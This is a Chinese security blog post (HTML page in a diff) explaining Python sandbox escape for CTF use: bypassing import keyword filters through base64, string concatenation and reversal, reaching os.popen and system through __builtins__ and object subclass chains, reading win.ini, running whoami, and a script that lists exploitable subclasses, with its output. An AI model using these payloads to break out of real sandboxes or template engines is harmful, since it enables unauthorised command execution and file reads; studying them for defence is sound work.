@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="One way to choose one">
+    <meta name="author" content="Misaki">
+    <meta name="keywords" content="">
+    <title>python 沙箱逃逸与SSTI ~ Misaki&#39;s Blog</title>
+    <link rel="stylesheet" href="/css/Material_Icons.css">
+    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+    
+        <link rel="stylesheet" href="/css/post.css">
+        
+            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+        
+    
+</head>
+
+<body class=" sidebar-collapse">
+<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
+    <div class="container">
+        <div class="navbar-translate">
+            <a class="navbar-brand" href="/">
+                Misaki&#39;s Blog</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+            </button>
+        </div>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ml-auto">
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/archives/">
+                                    archives
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/about/">
+                                    about
+                                </a>
+                            </li>
+                        
+                    
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-twitch"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-envelope"></i>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+    </div>
+</nav>
+    
+  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
+    
+      <div class="container">
+        <h1 class="title text-center post_title">python 沙箱逃逸与SSTI</h1>
+        <p class="text-center"><b>Tuesday, April 21st 2020, 9:11 am</b></p>
+      </div>
+    
+  </div>
+
+  
+  
+  
+    <div class="row" style="margin: 0 0 0; z-index: 999;">
+  <div class="col-md-8 offset-md-1">
+    <div class="main main-raised">
+      <div class="container">
+        <div class="section">
+          <div class="post_content">
+              <h2 id="沙箱逃逸概述"><a href="#沙箱逃逸概述" class="headerlink" title="沙箱逃逸概述"></a>沙箱逃逸概述</h2><p>沙箱逃逸就是在在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的过程。</p>
+<p>既然是想getshell，或者说是执行命令就需要一个可执行命令的包。可直接执行命令的模块有</p>
+<pre><code>os
+pty
+subprocess
+plarform
+commands
+</code></pre><p>有些时候，比如CTF，我们并不需要去执行命令，而是去读取目录下的flag文件即可，也就是说需要文件读取的模块来执行，常用的文件读取模块：</p>
+<pre><code>file
+open
+codecs
+fileinput
+</code></pre><p>不过其中file只在python2中执行，左2右3。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150419.png" alt="image-20200421092433264"></p>
+<h2 id="函数导入限制和绕过"><a href="#函数导入限制和绕过" class="headerlink" title="函数导入限制和绕过"></a>函数导入限制和绕过</h2><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>一个受限制的环境，禁止导入敏感的包是最常见的方法，所以import一般是最容易被限制掉。</p>
+<pre><code>import re,sys
+pattern  = re.compile(&#39;import\s+(os|subprocess)&#39;)
+match = re.search(pattern,sys.args[1])
+if match:
+    print &quot;forbidden module import detected&quot;
+    raise Exception
+</code></pre><p>这种简单的限制不能导入包的形式，可以中间添加空格来绕过，或者使用其他方式导入包，比如</p>
+<pre><code>__import__
+importlib
+</code></pre><p>还可以使用编码的方式绕过对导入包关键字的检查，比如使用base64，python2中适用</p>
+<pre><code>&gt;&gt;&gt; import base64
+&gt;&gt;&gt; base64.b64encode(&quot;os&quot;)
+&#39;b3M=&#39;
+&gt;&gt;&gt; flag = __import__(base64.b64decode(&#39;b3M=&#39;))
+&gt;&gt;&gt; flag.system(&#39;whoami&#39;)
+misaki\user
+
+&gt;&gt;&gt; import importlib
+&gt;&gt;&gt; flag = importlib.import_module(&#39;b3M=&#39;.decode(&#39;base64&#39;))
+&gt;&gt;&gt; flag.system(&#39;whoami&#39;)
+misaki\user
+</code></pre><p>或者使用字符串拼接的方式</p>
+<pre><code>&gt;&gt;&gt; __import__(&#39;o&#39;+&#39;s&#39;).system(&#39;who&#39;+&#39;ami&#39;)
+</code></pre><p>字符串f翻转截取</p>
+<pre><code>&gt;&gt;&gt; __import__(&#39;so&#39;[::-1]).system(&#39;whoami&#39;)
+misaki\user
+
+&gt;&gt;&gt; exec(&#39;)&quot;imaohw&quot;(metsys.so ;so tropmi&#39;[::-1])
+misaki\user
+</code></pre><p>再万一，他是这么禁止的</p>
+<pre><code>import re,sys
+pattern  = re.compile(&#39;import&#39;)
+match = re.search(pattern,sys.args[1])
+if match:
+    print &quot;forbidden module import detected&quot;
+    raise Exception
+</code></pre><p>这样的话，不管怎么换导入函数都会被禁止。那么是否有不直接使用import关键字来导入的方式。既然需要导入也就是只需要能执行对应的库就可以。</p>
+<p>使用execfile，不过在这之前需要判断得到库的物理路径。如果sys模块没被禁用的话，就可以使用sys来获取物理路径。这种方式只能用在python2中，python3取消了execfile</p>
+<pre><code>&gt;&gt;&gt; execfile(&#39;/usr/lib/python2.7/os.py&#39;)  #Linux系统下默认路径
+&gt;&gt;&gt; system(&#39;whoami&#39;)
+misaki
+</code></pre><p>python3可以利用读取文件，配合exec来执行</p>
+<pre><code>&gt;&gt;&gt; f = open(r&#39;/usr/lib/python3.6/os.py&#39;,&#39;r&#39;)
+&gt;&gt;&gt; exec(f.read())
+&gt;&gt;&gt; system(&#39;whoami&#39;)
+misaki
+
+#不可以执行利用exec打开读取，exec需要执行的是其中的内容，直接打开的时候exec执行的就是读取文件操作
+exec(&quot;open(&#39;/usr/lib/python3.6/os.py&#39;,&#39;r&#39;).read()&quot;)
+</code></pre><p>使用with open的形式</p>
+<pre><code>&gt;&gt;&gt; with open(&#39;/usr/lib/python3.6/os.py&#39;,&#39;r&#39;) as f:
+...     exec(f.read())
+...
+&gt;&gt;&gt; system(&#39;whoami&#39;)
+misaki
+</code></pre><p>或者使用字符串拼接的方式，但是需要跟exec，eval一起利用。</p>
+<pre><code>&gt;&gt;&gt; exec(&#39;imp&#39;+&#39;ort&#39;+&#39; &#39;+&#39;os;&#39;+&#39;os.system(&quot;whoami&quot;)&#39;)
+misaki\user
+</code></pre><p>这里exec不需要导入就可以直接引用，当然不需要导入就可以引用的函数不止这一个，因为一个内建函数的原因。</p>
+<h3 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a>__builtins__</h3><p>__builtins__即时引用，在程序还为执行代码的时候就已经加载进来了。此模块并不需要导入，可以在任何模块中执行引用。比如在python2中</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150423.png" alt="image-20200421095142948"></p>
+<p>在python3中</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150425.png" alt="image-20200421095205061"></p>
+<p>所以我们通过dict属性来调用这些函数，例如如下调用exec来执行其中的python语句。</p>
+<pre><code>&gt;&gt;&gt; __builtins__.__dict__[&#39;exec&#39;](&quot;print(&#39;ok&#39;)&quot;)
+ok
+</code></pre><p>通过内建函数来导入包</p>
+<pre><code>&gt;&gt;&gt; __builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)
+misaki\user
+</code></pre><p>万一跟上面一样，禁用了import，当然还可以使用拼接的方式</p>
+<pre><code>&gt;&gt;&gt; __builtins__.__dict__[&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)
+misaki\user
+</code></pre><p>如果在__builtins__中，部分需要引用的函数被删除。不能直接用dict属性来调用，可以使用reload来重新加载</p>
+<pre><code>reload(__builtin__)
+</code></pre><p>如果仔细看上面的图片就可以看到，在python2中reload也是__builtin__的内建函数。如果此函数被删除在python2中也不可以直接引用了。python3中reload不再是内建函数，3.4之前是imp模块下的函数，而之后是importlib模块下的函数。</p>
+<p>所以可以直接利用imp模块来导入，python2也可以利用。</p>
+<pre><code>&gt;&gt;&gt; import imp
+&gt;&gt;&gt; imp.reload(__builtins__)
+&lt;module &#39;__builtin__&#39; (built-in)&gt;
+</code></pre><p>在所上的导入模块中，系统的包都在一个默认路径下，被sys的modules存储记录。如果把其中的os模块删除就不能再去加载os模块了，这时候需要手动把os重新加载进去。一般尝试默认路径，或者sys查看存储路径</p>
+<pre><code>&gt;&gt;&gt; import sys
+&gt;&gt;&gt; sys.modules[&#39;os&#39;]=&#39;/usr/lib/python3.6/os.py&#39;
+&gt;&gt;&gt; import os
+&gt;&gt;&gt;
+</code></pre><h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>python沙箱逃逸还是离不开继承关系和子父类关系，在查看和使用类的继承，魔法函数起到了不可比拟的作用。</p>
+<p>先看看几个常用的魔法函数</p>
+<pre><code>__class__
+返回调用的类型
+
+class A():
+    pass
+
+a = A()
+print(a.__class__)  #&lt;class &#39;__main__.A&#39;&gt;
+</code></pre><pre><code>__mro__
+查看类继承的所有父类，直到object
+
+class A:
+    pass
+class B(A):
+    pass
+class C(A):
+    pass
+class D(B, C):
+    pass
+print(D.__mro__) #(&lt;class &#39;__main__.D&#39;&gt;, &lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.C&#39;&gt;, &lt;class &#39;__main__.A&#39;&gt;, &lt;class &#39;object&#39;&gt;)
+</code></pre><pre><code>__subclasses__
+获取类的所有子类
+
+class A(object):
+    pass
+class B(A):
+    pass
+class C(A):
+    pass
+
+print(A.__subclasses__()) #[&lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.C&#39;&gt;]
+</code></pre><pre><code>__bases__
+返回所有直接父类组成的元组
+
+class A(object):
+    pass
+class B(A):
+    pass
+
+print(B.__bases__)  #(&lt;class &#39;__main__.A&#39;&gt;,)  不返回object类
+</code></pre><pre><code>__init__
+类实例创建之后调用, 对当前对象的实例的一些初始化
+
+class A:
+    def __init__(self):
+        print(&#39;ok&#39;)
+
+a = A()  # 输出ok
+</code></pre><pre><code>__globals__
+能够返回函数所在模块命名空间的所有变量
+
+class A(object):
+    def __init__(self, a, b):
+        self.a = a
+        self.b = b
+
+a.__init__.__globals__
+{&#39;A&#39;: &lt;class &#39;__main__.A&#39;&gt;, &#39;a&#39;: &lt;__main__.A object at 0x0000000001692390&gt;, &#39;importlib&#39;: &lt;module &#39;importlib&#39; f
+rom &#39;D:\anaconda\lib\importlib\__init__.pyc&#39;&gt;, &#39;__builtins__&#39;: &lt;module &#39;__bu
+iltin__&#39; (built-in)&gt;, &#39;pattern&#39;: &lt;_sre.SRE_Pattern object at 0x0000000001695030&gt;, &#39;base64&#39;: &lt;module &#39;base64&#39; f
+rom &#39;D:\anaconda\lib\base64.pyc&#39;&gt;, &#39;sys&#39;: &lt;module &#39;sys&#39; (
+built-in)&gt;, &#39;flag&#39;: &lt;module &#39;os&#39; from &#39;D:\anaconda\lib\os.p
+yc&#39;&gt;, &#39;__packa
+ge__&#39;: None, &#39;os&#39;: &lt;module &#39;os&#39; from &#39;D:\anaconda\lib\os.pyc&#39;&gt;, &#39;__doc__&#39;: None, &#39;match&#39;: &lt;_sre.SRE_Match obje
+ct at 0x00000000039A9B28&gt;}
+</code></pre><pre><code>__getattribute__
+当类被调用的时候，无条件进入此函数。
+__getattr__
+对象中不存在的属性时调用
+
+class A:
+    def __init__(self):
+        self.name = &quot;Bob&quot;
+    def __getattribute__(self,item):
+        print(&quot;ok&quot;)
+
+a = A()  
+a.name   #ok, 这时候不管调用什么属性都会返回ok，相当于拦截了属性调用。
+
+    def __getattr__(self):
+        print(&#39;getattr&#39;)
+a.age   #getattr  调用不存在的属性会执行，相当于处理了AttributeError。
+</code></pre><h3 id="类继承使用"><a href="#类继承使用" class="headerlink" title="类继承使用"></a>类继承使用</h3><p>尝试利用继承关系来找到object类</p>
+<pre><code>&quot;&quot;.__class__.__bases__   #(&lt;class &#39;object&#39;&gt;,)
+</code></pre><p>前面不仅可以使用双引号，还可以利用列表或者字典类型，区别在查找类型的时候在不同的基础上查找，返回都是元组。</p>
+<pre><code>[].__class__.__bases__
+{}.__class__.__bases__
+</code></pre><p>在object类下去查找所有的子类，然后去查找可利用类，__bases__返回是元组，使用下标获得object类。</p>
+<pre><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150429.png" alt="image-20200421145832381"></p>
+<p>找到需要使用的类，其中有可以使用的类，在python3中使用</p>
+<pre><code>&lt;class &#39;os._wrap_close&#39;&gt;,&lt;class &#39;warnings.WarningMessage&#39;&gt;
+</code></pre><p>调用他们</p>
+<pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128]
+&lt;class &#39;os._wrap_close&#39;&gt;
+
+&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[177]
+&lt;class &#39;warnings.WarningMessage&#39;&gt;
+</code></pre><p>如果子类过多，不好查找是第几个下标，可以使用如下来标记</p>
+<pre><code>for i in enumerate(&quot;&quot;.__class__.__bases__[0].__subclasses__()): 
+    print i
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150432.png" alt="image-20200421150812786"></p>
+<p>先来读取一下文件，C盘下的win.ini文件</p>
+<pre><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150434.png" alt="image-20200421162023248"></p>
+<p>从中查找是否有关于文件读取的方法，比如open，file函数。在最后找到一个popen函数。</p>
+<pre><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&quot;C:\\windows\\win.ini&quot;).read()
+</code></pre><p>如果想直接在终端显示出来</p>
+<pre><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&quot;type C:\\windows\\win.ini&quot;).read()
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150436.png" alt="image-20200423141850480"></p>
+<p>在python2中可以使用如下形式读取文件的第一行，在python2中前面是否字符串还是元组或者字典对后面类的查找有不一样的结果。</p>
+<pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].getline(&quot;C:\\windows\\win.ini&quot;,1)
+</code></pre><p>执行命令</p>
+<pre><code>&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;whoami&#39;)
+misaki\user
+</code></pre><p>但是python2如果使用字符串的形式，会报如下错误，因为<code>__bases__</code>获取的并不是object类</p>
+<pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[59]
+Traceback (most recent call last):
+  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+IndexError: list index out of range
+</code></pre><p>只需要再去获得一次即可</p>
+<pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__bases__[0].__subclasses__()[59]
+&lt;class &#39;warnings.WarningMessage&#39;&gt;
+</code></pre><h2 id="特殊函数查找"><a href="#特殊函数查找" class="headerlink" title="特殊函数查找"></a>特殊函数查找</h2><h3 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h3><p>在GitHub的python页面上把自带函数全部获取目前的3.8的模块(202)</p>
+<pre><code>asyncio
+collections
+concurrent
+ctypes
+curses
+dbm
+distutils
+email
+encodings
+......
+warnings.py
+wave.py
+weakref.py
+webbrowser.py
+xdrlib.py
+zipapp.py
+zipfile.py
+zipimport.py
+</code></pre><p>将这么模块进行筛选，规则这些模块哪些有调用上面提到的模块，或者文件读取等方法。</p>
+<pre><code># coding=UTF-8
+import codecs
+from collections import defaultdict
+with codecs.open(&#39;python.txt&#39;, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:
+    modules = f.readlines()
+modules = [m.strip().replace(&#39;.py&#39;, &#39;&#39;) for m in modules]
+target_modules = [&#39;os&#39;, &#39;platform&#39;, &#39;subprocess&#39;, &#39;timeit&#39;, &#39;importlib&#39;, &#39;codecs&#39;, &#39;sys&#39;, &#39;commands&#39;]
+target_functions = [&#39;__import__&#39;, &#39;__builtins__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;file&#39;, &#39;open&#39;, &#39;codecs&#39;]
+all_targets = target_modules + target_functions
+results = defaultdict(list)
+for m in modules:
+    try:
+        module = __import__(m)
+    except Exception as e:
+        # print(&#39;ERROR:&#39;, m)
+        pass
+    for t in all_targets:
+        if t in module.__dict__:
+            results[m.encode()].append(t)
+print(&quot;可利用模块数量为:&quot;+str(len(results)))
+for k, v in results.items():
+    print(k, v)
+</code></pre><p>筛选完成后有python3两百个模块可能可以利用，然后再利用脚本进一步筛选</p>
+<pre><code>find_modules = {    }
+target_modules = [&#39;os&#39;, &#39;platform&#39;, &#39;subprocess&#39;, &#39;timeit&#39;, &#39;importlib&#39;, &#39;codecs&#39;, &#39;sys&#39;]
+target_functions = [&#39;__import__&#39;, &#39;__builtins__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;file&#39;, &#39;open&#39;]
+all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))
+all_modules = list(set(list(find_modules.keys()) + target_modules))
+subclasses = ().__class__.__bases__[0].__subclasses__()
+sub_name = [s.__name__ for s in subclasses]
+# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#39;./test.py&#39;).read()
+print(&#39;----------1-----------&#39;)
+for i, s in enumerate(sub_name):
+    for f in all_targets:
+        if f == s:
+            if f in target_functions:
+                print(i, f)
+            elif f in all_modules:
+                target = find_modules[f]
+                sub_dict = subclasses[i].__dict__
+                for t in target:
+                    if t in sub_dict:
+                        print(i, f, target)
+print(&#39;----------2-----------&#39;)
+# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)
+for i, sub in enumerate(subclasses):
+    try:
+        more = sub.__init__.__globals__
+        for m in all_targets:
+            if m in more:
+                print(i, sub, m, find_modules.get(m))
+    except Exception as e:
+        pass
+print(&#39;----------3-----------&#39;)
+# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)
+for i, sub in enumerate(subclasses):
+    try:
+        more = sub.__init__.__globals__.values()
+        for j, v in enumerate(more):
+            for f in all_targets:
+                try:
+                    if f in v:
+                        if f in target_functions:
+                            print(i, j, sub, f)
+                        elif f in all_modules:
+                            target = find_modules.get(f)
+                            sub_dict = v[f].__dict__
+                            for t in target:
+                                if t in sub_dict:
+                                    print(i, j, sub, f, target)
+                except Exception as e:
+                    pass
+    except Exception as e:
+        pass
+print(&#39;----------4-----------&#39;)
+# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)
+# &lt;class &#39;warnings.catch_warnings&#39;&gt;类很特殊，在内部定义了_module=sys.modules[&#39;warnings&#39;]，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似
+for i, sub in enumerate(subclasses):
+    try:
+        more = sub()._module.__builtins__
+        for f in all_targets:
+            if f in more:
+                print(i, f)
+    except Exception as e:
+        pass
+</code></pre><pre><code>----------2-----------
+75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __builtins__ None
+75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__ None
+75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; sys None
+76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __builtins__ None
+76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__ None
+76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; sys None
+77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __builtins__ None
+77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__ None
+77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; sys None
+78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __builtins__ None
+78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__ None
+78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; sys None
+79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __builtins__ None
+79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__ None
+79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; sys None
+91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __builtins__ None
+91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; sys None
+92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __builtins__ None
+92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; sys None
+93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __builtins__ None
+93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; sys None
+95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __builtins__ None
+95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; sys None
+103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __builtins__ None
+103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; sys None
+103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None
+104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __builtins__ None
+104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; sys None
+104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None
+105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __builtins__ None
+105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; sys None
+105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None
+106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __builtins__ None
+106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; sys None
+106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None
+128 &lt;class &#39;os._wrap_close&#39;&gt; __builtins__ None
+128 &lt;class &#39;os._wrap_close&#39;&gt; sys None
+128 &lt;class &#39;os._wrap_close&#39;&gt; open None
+129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __builtins__ None
+129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; sys None
+130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __builtins__ None
+130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; sys None
+137 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __builtins__ None
+138 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __builtins__ None
+139 &lt;class &#39;warnings.WarningMessage&#39;&gt; __builtins__ None
+139 &lt;class &#39;warnings.WarningMessage&#39;&gt; sys None
+140 &lt;class &#39;warnings.catch_warnings&#39;&gt; __builtins__ None
+140 &lt;class &#39;warnings.catch_warnings&#39;&gt; sys None
+167 &lt;class &#39;reprlib.Repr&#39;&gt; __builtins__ None
+174 &lt;class &#39;functools.partialmethod&#39;&gt; __builtins__ None
+176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __builtins__ None
+176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; sys None
+177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __builtins__ None
+177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; sys None
+----------3-----------
+75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec
+75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; eval
+75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; compile
+75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__
+75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open
+76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec
+76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; eval
+76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; compile
+76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__
+76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open
+77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec
+77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; eval
+77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; compile
+77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__
+77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open
+78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec
+78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; eval
+78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; compile
+78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__
+78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open
+79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec
+79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; eval
+79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; compile
+79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__
+79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open
+91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec
+91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; eval
+91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; compile
+91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __import__
+91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open
+92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec
+92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; eval
+92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; compile
+92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __import__
+92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open
+93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec
+93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; eval
+93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; compile
+93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __import__
+93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open
+95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec
+95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; eval
+95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; compile
+95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __import__
+95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open
+103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec
+103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; eval
+103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; compile
+103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __import__
+103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open
+103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open
+104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec
